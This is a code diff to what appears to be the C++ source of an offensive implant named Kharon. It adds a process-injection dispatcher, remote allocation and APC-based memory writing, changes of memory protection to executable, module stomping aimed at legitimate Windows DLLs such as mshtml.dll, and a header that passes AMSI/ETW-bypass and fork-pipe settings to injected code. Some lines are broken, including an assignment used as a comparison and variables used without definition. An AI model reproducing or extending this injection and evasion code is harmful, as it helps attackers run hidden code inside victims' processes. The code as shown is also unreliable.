@@ -1,5 +1,22 @@
 #include <Kharon.h>
 
+auto Injection::Main(
+    _In_    BYTE*    Buffer,
+    _In_    SIZE_T   Size,
+    _In_    BYTE*    ArgBuff,
+    _In_    SIZE_T   ArgSize,
+    _Inout_ INJ_OBJ* Object
+) -> BOOL {
+    switch ( Self->Config.Injection.TechniqueId ) {
+    case INJECTION_STANDARD:
+        return Self->Inj->Standard( Buffer, Size, ArgBuff, ArgSize, Object ); break;
+    case INJECTION_STOMPING:
+        return Self->Inj->Stomp( Buffer, Size, ArgBuff, ArgSize, Object ); break;    
+    default:
+        break;
+    }
+}
+
 auto DECLFN Injection::Standard(
     _In_    BYTE*    Buffer,
     _In_    SIZE_T   Size,
@@ -29,7 +46,7 @@ auto DECLFN Injection::Standard(
     if ( ! Object->PsHandle ) {
         PsHandle = Self->Ps->Open( PsOpenFlags, FALSE, Object->ProcessId );
         KhDbg("Opened process handle: %p", PsHandle);
-        if ( PsHandle == INVALID_HANDLE_VALUE ) {
+        if ( PsHandle == INVALID_HANDLE_VALUE || ! PsHandle ) {
             KhDbg("Failed to open process %lu", Object->ProcessId);
             return FALSE;
         }
@@ -48,12 +65,14 @@ auto DECLFN Injection::Standard(
 
     auto MemAlloc = [&]( SIZE_T AllocSize ) -> PVOID {
         PVOID addr = nullptr;
-        if ( Self->Config.Injection.Alloc == 0 ) {
+        if ( Self->Config.Injection.Allocation == 0 ) {
             addr = Self->Mm->Alloc( nullptr, AllocSize, MEM_COMMIT, PAGE_READWRITE, PsHandle );
             KhDbg("Mm::Alloc: %p (size=%llu)", addr, AllocSize);
-        } else {
+        } else if ( Self->Config.Injection.Allocation = 1 ) {
             addr = Self->Mm->DripAlloc( AllocSize, PAGE_READWRITE, PsHandle );
             KhDbg("DripAlloc: %p (size=%llu)", addr, AllocSize);
+        } else {
+            KhDbg("unknown type");
         }
         return addr;
     };
@@ -65,13 +84,32 @@ auto DECLFN Injection::Standard(
              if ( (BOOL)Mem::Copy( Dst, Src, CopySize ) ) result = TRUE;
              KhDbg("Local Mem::Copy result=%d", result);
              return result;
-        } else if ( Self->Config.Injection.Write == 0 ) {
+        } else if ( Self->Config.Injection.Writing == 0 ) {
             result = (BOOL)Self->Mm->Write( Dst, (BYTE*)Src, CopySize, 0, PsHandle );
             KhDbg( "Write result=%d", result);
         } else {
             result = (BOOL)Self->Mm->WriteAPC( PsHandle, Dst, (BYTE*)Src, CopySize );
             KhDbg( "WriteAPC result=%d", result);
         }
+        return result;
+    };
+
+    auto MemProt = [&]( PVOID Ptr, SIZE_T Size ) -> BOOL {
+        BOOL  result      = FALSE;
+        ULONG GranCount   = ( PAGE_ALIGN( Size ) / Self->Mm->PageGran ) + 1;
+        ULONG OldProt     = 0;
+        PVOID CurrentBase = Ptr;
+        
+        if ( Self->Config.Injection.Allocation == 1 ) {
+            for ( INT32 i = 0; i < GranCount; i++ ) {
+                result = Self->Mm->Protect( CurrentBase, Self->Mm->PageGran, PAGE_EXECUTE_READ, &OldProt, PsHandle );
+
+                CurrentBase = (PVOID)( (UPTR)CurrentBase + Self->Mm->PageGran );
+            }
+        } else {
+            result = Self->Mm->Protect( Ptr, Size, PAGE_EXECUTE_READ, &OldProt, PsHandle );
+        }
+
         return result;
     };
 
@@ -191,7 +229,7 @@ auto DECLFN Injection::Standard(
         return Cleanup();
     }
 
-    if ( ! Self->Mm->Protect( BaseAddress, FullSize, PAGE_EXECUTE_READ, &OldProt, PsHandle ) ) {
+    if ( ! MemProt( BaseAddress, FullSize ) ) {
         KhDbg("Failed to change protection on BaseAddress %p", BaseAddress);
         return Cleanup();
     }
@@ -229,12 +267,44 @@ auto DECLFN Injection::Stomp(
         PsHandle = Object->PsHandle;
     }
 
-    auto GetTargetDll = [&]( BOOL IsRnd ) -> CHAR* {
-        CHAR* DllName = nullptr;
+    WCHAR* PrefModules[] = {L"edgehtml.dll", L"mshtml.dll", L"wmp.dll", L"mfc140d.dll", L"mfc140ud.dll", L"mstscax.dll", L"onnxruntime.dll", L"twinui.pcshell.dll"};
 
-        if ( IsRnd ) {
-            
+    auto ValidTextSize = [&]( CHAR* LibPath ) -> BOOL {
+        HANDLE FileHandle = Self->Krnl32.CreateFileW( 
+            Self->Config.Injection.StompModule, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, 0
+        );
+        if ( ! FileHandle || FileHandle == INVALID_HANDLE_VALUE ) {
+            return FALSE;
         }
+
+        ULONG FileSize = Self->Krnl32.GetFileSize( FileHandle, 0 );
+        if ( ! FileSize ) {
+            if ( FileHandle ) Self->Ntdll.NtClose( FileHandle );
+            return FALSE;
+        }
+
+        PBYTE FileBuff = (PBYTE)Self->Mm->Alloc( nullptr, FileSize, MEM_COMMIT, PAGE_READWRITE );
+        if ( ! FileBuff ) {
+            if ( FileHandle ) Self->Ntdll.NtClose( FileHandle );
+            return FALSE;
+        }
+
+        if ( ! Self->Krnl32.ReadFile( FileHandle, FileBuff, FileSize, nullptr, nullptr ) ) {
+            if ( FileHandle ) Self->Ntdll.NtClose( FileHandle );
+            if ( FileBuff   ) Self->Mm->Free( FileBuff, FileSize, MEM_RELEASE );
+            return FALSE;
+        }
+
+        IMAGE_NT_HEADERS* FileHeader = (IMAGE_NT_HEADERS*)( FileBuff + reinterpret_cast<IMAGE_DOS_HEADER*>( FileBuff )->e_lfanew );
+        
+        ULONG TextSize = FileHeader->OptionalHeader.SizeOfCode;
+        
+        if ( FileHandle ) Self->Ntdll.NtClose( FileHandle );
+        if ( FileBuff   ) Self->Mm->Free( FileBuff, FileSize, MEM_RELEASE );
+
+        if ( TextSize < Size ) return FALSE;
+
+        return TRUE;
     };
 
     auto MemWrite = [&]( PVOID Dst, PVOID Src, SIZE_T CopySize ) -> BOOL {
@@ -242,11 +312,68 @@ auto DECLFN Injection::Stomp(
         if ( PsHandle == NtCurrentProcess() ) {
              if ( (BOOL)Mem::Copy( Dst, Src, CopySize ) ) result = TRUE;
              return result;
-        } else if (Self->Config.Injection.Write == 0) {
+        } else if (Self->Config.Injection.Writing == 0) {
             result = (BOOL)Self->Mm->Write( Dst, (BYTE*)Src, CopySize, 0, PsHandle );
         } else {
             result = (BOOL)Self->Mm->WriteAPC( PsHandle, Dst, (BYTE*)Src, CopySize );
         }
         return result;
     };
+
+    PVOID TempAddress    = Self->Mm->Alloc( nullptr, ArgSize + 16, MEM_COMMIT, PAGE_READWRITE );
+    PVOID CurrentTempPos = TempAddress;
+
+    if ( Object->ForkCategory || Object->ExecMethod ) {
+        SIZE_T headerSize   = 16; 
+        SIZE_T pipeNameSize = 0;
+        CHAR*  pipeName     = nullptr;
+        
+        if ( Object->ExecMethod == KH_METHOD_FORK ) {
+            pipeName      = KH_FORK_PIPE_NAME;
+            pipeNameSize  = Str::LengthA( pipeName ); 
+            headerSize   += 4 + pipeNameSize;
+        }
+        
+        headerSize += 4 + ArgSize;
+
+        KhDbg("header: %p", CurrentTempPos);
+        
+        *(ULONG*)CurrentTempPos = Object->ExecMethod;
+        CurrentTempPos += 4;
+        
+        *(ULONG*)CurrentTempPos = Object->ForkCategory;
+        CurrentTempPos += 4;
+        
+        *(ULONG*)CurrentTempPos = Self->Config.Syscall;
+        CurrentTempPos += 4;
+        
+        *(ULONG*)CurrentTempPos = Self->Config.AmsiEtwBypass;
+        CurrentTempPos += 4;
+        
+        if ( Object->ExecMethod == KH_METHOD_FORK ) {
+            *(ULONG*)CurrentTempPos = (ULONG)pipeNameSize;
+            CurrentTempPos += 4;
+            
+            Mem::Copy( CurrentTempPos, (PBYTE)pipeName, pipeNameSize );
+            CurrentTempPos += pipeNameSize;
+        }
+        
+        if ( ArgSize > 0 ) {
+            Mem::Copy( CurrentTempPos, ArgBuff, ArgSize );
+            CurrentTempPos += ArgSize;
+        }
+        
+        KhDbg("Added injection header: ExecMethod=%lu, ForkCategory=%lu, Syscall=%lu, AmsiEtwBypass=%lu, PipeSize=%lu, ArgSize=%lu, TotalHeaderSize=%llu", 
+            Object->ExecMethod, Object->ForkCategory, Self->Config.Syscall, Self->Config.AmsiEtwBypass, pipeNameSize, ArgSize, headerSize); 
+        
+        KhDbg("Parameter points to: %p", Parameter);
+    } else if ( ArgSize > 0 ) {
+        Mem::Copy( CurrentTempPos, ArgBuff, ArgSize );
+        KhDbg("Copied ArgBuff (size=%llu), Parameter=%p", ArgSize, Parameter);
+    }
+
+    if ( ! MemWrite( BaseAddress, TempAddress, FullSize ) ) {
+        KhDbg("Failed MemWrite to process");
+        return Cleanup();
+    }
 }   
